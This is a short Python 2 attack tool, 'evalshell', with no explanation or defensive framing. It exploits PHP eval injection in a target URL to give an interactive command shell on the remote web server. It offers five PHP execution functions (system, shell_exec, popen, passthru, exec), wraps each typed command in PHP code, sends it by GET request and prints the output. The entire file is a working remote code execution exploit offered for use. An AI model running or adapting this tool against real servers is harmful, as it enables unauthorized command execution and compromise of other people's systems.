#!/usr/bin/python

import sys
import requests

print """
                   __     __         ____
  ___ _   ______ _/ /____/ /_  ___  / / /
 / _ \ | / / __ `/ / ___/ __ \/ _ \/ / / 
/  __/ |/ / /_/ / (__  ) / / /  __/ / /  
\___/|___/\__,_/_/____/_/ /_/\___/_/_/   
                                                                                                  

"""

if len(sys.argv) != 2:
    print "Usage: ./evalshell.py <targeturl>"
    print "Example: ./evalshell.py http://localhost/test.php?eval="
    sys.exit(0)

url = sys.argv[1]

print "Select execution type to use\n"
print "1. system() function"
print "2. shell_exec() function"
print "3. popen() function"
print "4. passthru() function"
print "5. exec() function"
func = raw_input("Function to use: ")
if func == "1":
    print "[+] Using system"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "system('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
elif func == "2":
    print "[+] Using shell_exec"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "echo shell_exec('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
elif func == "3":
    print "[+] Using popen"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "popen('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
elif func == "4":
    print "[+] Using passthru"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "passthru('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
elif func == "5":
    print "[+] Using exec"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "echo exec('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text

